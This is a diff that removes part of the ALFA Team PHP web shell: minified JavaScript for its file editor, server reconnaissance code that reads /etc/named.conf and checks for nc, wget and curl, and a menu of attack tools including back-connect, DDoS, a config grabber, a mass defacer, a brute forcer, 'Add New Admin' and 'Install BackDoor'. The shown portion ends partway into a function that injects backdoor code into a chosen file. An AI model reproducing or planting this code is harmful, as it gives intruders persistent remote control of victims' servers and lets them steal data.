showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("alfa_history_files");try{for(var p in editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return alfaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==l&&null!=l&&0!=l.length)n=alfab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=alfab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),alfaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?alfaloader(b,"block"):(alfaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(a)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&alfaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?alfaLoaderOnTop("none"):alfaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&alfaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&alfaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),alfaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function alfaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("alfa-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="alfa-ace-plugin",t.onload=function(){alfaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==alfa_ace_editors.editor&&(alfa_ace_editors.editor={});var i=getCookie("alfa_ace_theme_editor"),l=getCookie("alfa_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),alfa_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),alfa_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),alfa_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),alfa_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),alfa_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),alfa_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),alfa_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==alfa_ace_editors.eval&&(alfa_ace_editors.eval={});i=getCookie("alfa_ace_theme_eval"),l=getCookie("alfa_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),alfa_ace_editors.eval["phpeval-"+o]=ace.edit(t),alfa_ace_editors.eval["phpeval-"+o].setReadOnly(a),alfa_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),alfa_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),alfa_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),alfa_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("alfa_history_files",JSON.stringify(editor_files),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=alfa_ace_editors.editor[e].selection.toJSON();alfa_ace_editors.editor[e].selectAll(),alfa_ace_editors.editor[e].focus(),document.execCommand("copy"),alfa_ace_editors.editor[e].selection.fromJSON(a),alfaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=alfab64(e,!0),a=alfab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return alfab64(i,!0)}function reloadSetting(e){return alfaloader(alfa_before_do_action_id,"block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&alfa9="+alfab64(e.cgi_api.value)+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),alfaloader(a,"none")},!1,alfa_before_do_action_id),alfa_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(a))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e)},!0)}function alfab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=alfa_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
-</script>
-<?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
-<input type='hidden' name='a' value='dlfile'>
-<input type='hidden' name='c' value=''>
-<input type='hidden' name='file' value=''>
-</form>
-<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
-<div id='a_loader'><img src='".__showicon('loader')."'></div>";
-$cmd_uname = alfaEx("uname -a",false,false);
-$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
-if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
-echo '
-</head>
-<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
-<div id="up_bar_holder"></div>
-<div class="whole">
-<form method="post" name="mf" style="display:none;">
-<input type="hidden" name="a">
-<input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
-for($s=1;$s<=10;$s++){
-echo '<input type="hidden" name="alfa'.$s.'">';
-}
-echo '<input type="hidden" name="charset">
-</form>
-<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
-<div class="header"><table width="100%" border="0">
-<tr>
-<td width="3%"><span class="header_vars">Uname:</span></td>
-<td colspan="2"><span class="header_values" id="header_uname">'.$uname.'</span></td>
-</tr>
-<tr>
-<td><span class="header_vars">User:</span></td>
-<td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
-</tr>
-<tr>
-<td><span class="header_vars">PHP:</span></td>
-<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$safe_modes.'</span></td>
-</tr>
-<tr>
-<td><span class="header_vars">ServerIP:</span></td>
-<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
-</tr>
-<tr>
-<td width="3%"><span class="header_vars">DateTime:</span></td>
-<td colspan="2"><b>'.date('Y-m-d H:i:s').'</b></td>
-</tr>
-<tr>
-<td><span class="header_vars">Domains:</span></td>
-<td width="76%"><span class="header_values" id="header_domains">';
-if($GLOBALS['sys']=='unix'){
-$d0mains = _alfa_file("/etc/named.conf",false);
-if(!$d0mains){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
-$count=0;
-foreach($d0mains as $d0main){
-if(@strstr($d0main,"zone")){
-preg_match_all('#zone "(.*)"#', $d0main, $domains);
-flush();
-if(strlen(trim($domains[1][0])) > 2){
-flush();
-$count++;}}}
-echo "$count Domains";}}
-else{echo("Cant Read [ /etc/named.conf ]");}
-echo '</span></td>
-</tr>
-<tr>
-<td height="16"><span class="header_vars">HDD:</span></td>
-<td><span class="header_vars">Total:</span><b>'.alfaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
-</tr>';
-if($GLOBALS['sys']=='unix'){
-$useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
-if(!@ini_get('safe_mode')){
-if(strlen(alfaEx("id",false,false))>0){
-echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
-$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
-$x=0;
-foreach($userful as $item)if(alfaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
-if($x==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
-echo '</td>
-</tr>
-<tr>
-<td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
-$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
-$x=0;
-foreach($downloaders as $item2)if(alfaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
-if($x==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
-echo '</td>
-</tr>';
-}else{
-echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
-}
-}else{
-echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
-}
-}else{
-echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
-echo alfaEx('ver',false,false);
-echo '</td>
-</tr> <tr>
-<td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
-</tr></b>';
-}
-$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
-echo '<tr>
-<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
-</tr>
-<tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
-</tr>
-<tr>
-<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
-</tr>
-<tr>
-<td height="11"><span class="header_vars">SoftWare: </span></td>
-<td colspan="2"><b>'.@getenv('SERVER_SOFTWARE').'</b></td>
-</tr>';
-if($GLOBALS['sys']=="win"){
-echo '<tr>
-<td height="12"><span class="header_vars">DRIVE:</span></td>
-<td colspan="2"><b>'.$drives.'</b></td>
-</tr>';
-}
-echo '<tr>
-<td height="12"><span class="header_vars">PWD:</span></td>
-<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
-</tr>
-</table>
-</div>
-<div id="meunlist">
-<ul>
-';
-$li = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
-'zoneh'=>'ZONE-H','dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL','cpcrack'=>'Hash Tools',
-'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','deziper'=>'DeCompressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
-'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher','config_grabber'=>'Config Grabber','fakepage'=>'Fake Page','archive_manager'=>'Archive Manager',
-'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
-);
-foreach($li as $key=>$value){
-echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
-}
-echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
-@error_reporting(E_ALL ^ E_NOTICE);
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('magic_quotes_runtime', 0);
-@set_time_limit(0);
-}}
-function alfalogout(){
-@setcookie("AlfaUser", null, 2012);
-@setcookie("AlfaPass", null, 2012);
-unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
-echo("ok");
-}
-function showAnimation($name){
-	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
-}
-function __showicon($r){
-	$s['btn']='https://privdayz.com/wp-content/themes/privdaysv1/assets/img/default-coin.png';
-	$s['alfamini']='https://privdayz.com/wp-content/themes/privdaysv1/assets/img/default-coin.png';
-	$s['loader']='https://privdayz.com/wp-content/themes/privdaysv1/assets/img/default-coin.png';
-	//return 'data:image/png;base64,'.__get_resource($s[$r]);
-	return $s[$r];
-}
-function alfainbackdoor(){
-alfahead();
-echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
-$error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
-$success= '<font color="green">Success...!';
-$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
-$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
-$cwd = 'Example: /home/alfa/public_html/index.php';
-if($_POST['alfa1']=='file'){
-echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$textarea}</form></p></center>");
-if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
-$method = $_POST['alfa2'];
-$file = $_POST['alfa3'];
-$shell = $_POST['alfa4'];
-$key = str_replace(array('"','\''),'',trim($_POST['alfa5']));
-if($key=='')$key='alfa';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
